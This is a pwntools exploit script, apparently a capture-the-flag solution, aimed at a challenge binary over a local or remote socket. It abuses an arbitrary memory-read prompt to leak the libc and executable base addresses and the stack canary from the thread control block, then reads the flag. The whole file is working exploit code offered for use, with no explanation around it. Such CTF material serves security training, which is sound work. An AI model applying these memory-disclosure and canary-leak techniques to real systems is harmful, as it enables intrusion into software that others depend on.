#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["kitty", "@launch", "--location=split"]
exe = context.binary = ELF(args.EXE or '../dist/chall')
if args.LOCAL:
    libc = ELF("/usr/lib/libc.so.6.dbg")
else:
    libc = ELF(libcdb.search_by_build_id("a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 10006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def read(offset):
    io.sendlineafter(b"Offset: ", str(offset).encode())
    io.recvuntil(b"Value: ")
    return io.recvline().strip()

io = start()

libc.address = u64(read(exe.got["setvbuf"]) + b"\0\0") - libc.sym["setvbuf"]
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0

tcb_offset = 0x1e3680 if args.LOCAL else -0x28c0
tcb = libc.address + tcb_offset
log.info(f"tcb @ 0x{tcb:x}")

exe.address = u64(read(exe.sym["__dso_handle"]) + b"\0\0") - exe.sym["__dso_handle"]
log.info(f"exe @ 0x{exe.address:x}")
assert exe.address & 0xfff == 0

canary = u64(b"\0" + read(tcb + 0x29 - exe.address)[:7])
log.info(f"canary = 0x{canary:x}")

flag = canary >> 32 << 12
print(read(flag - exe.address).decode())
